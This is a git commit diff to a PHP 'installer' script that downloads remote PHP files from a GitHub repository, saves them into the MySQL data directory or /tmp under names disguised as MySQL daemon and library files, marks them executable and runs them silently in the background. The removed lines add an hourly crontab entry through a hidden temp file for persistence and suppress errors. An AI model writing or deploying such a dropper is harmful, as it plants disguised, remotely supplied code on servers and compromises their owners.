394734b8efdd498ae6838850c1127c065863475a
0pt1mist <98191956+0pt1mist@users.noreply.github.com>
2026-03-12 12:27:16 +0700

    Update installer.php

--- installer.php
+++ installer.php
@@ -1,35 +1,32 @@
 <?php
-
-error_reporting(0);
+error_reporting(E_ALL);
 
 $gitBase = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main/";
 $targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
 $sysHash = substr(md5(gethostname()), 0, 4);
-$logFile = $targetDir . ".mysql_audit.log";
+
+$name1 = "mysql_daemon_" . $sysHash . ".php";
+$name2 = "mysql_lib_" . $sysHash . ".php";
+$logName = ".mysql_audit.log";
 
 $files = [
-    "file1.php" => "mysql_daemon_" . $sysHash . ".php",
-    "file2.php" => "mysql_lib_" . $sysHash . ".php"
+    "file1.php" => $name1,
+    "file2.php" => $name2
 ];
 
+echo "--- Installation Started ---\n";
 foreach ($files as $gitName => $localName) {
     $path = $targetDir . $localName;
-    if (!file_exists($path)) {
-        $content = file_get_contents($gitBase . $gitName);
-        if ($content) {
-            file_put_contents($path, $content);
-            chmod($path, 0755);
-            file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] [Installer]: Downloaded $gitName from GitHub\n", FILE_APPEND);
-            exec("php $path > /dev/null 2>&1 &");
-        }
+    $content = @file_get_contents($gitBase . $gitName);
+    if ($content) {
+        file_put_contents($path, $content);
+        chmod($path, 0755);
+        echo "[+] Created: $path\n";
+        exec("/usr/bin/php $path > /dev/null 2>&1 &");
+    } else {
+        echo "[!] Error: Could not download $gitName\n";
     }
 }
 
-$cron = shell_exec("crontab -l 2>/dev/null");
-if (strpos($cron, "installer.php") === false) {
-    $job = "0 * * * * php " . __FILE__ . " > /dev/null 2>&1\n";
-    file_put_contents("/tmp/.c", $cron . $job);
-    shell_exec("crontab /tmp/.c");
-}
-// echo "Installation complete. Files placed in $targetDir\n";
+echo "[i] Shared Log Path: " . $targetDir . $logName . "\n";
 ?>
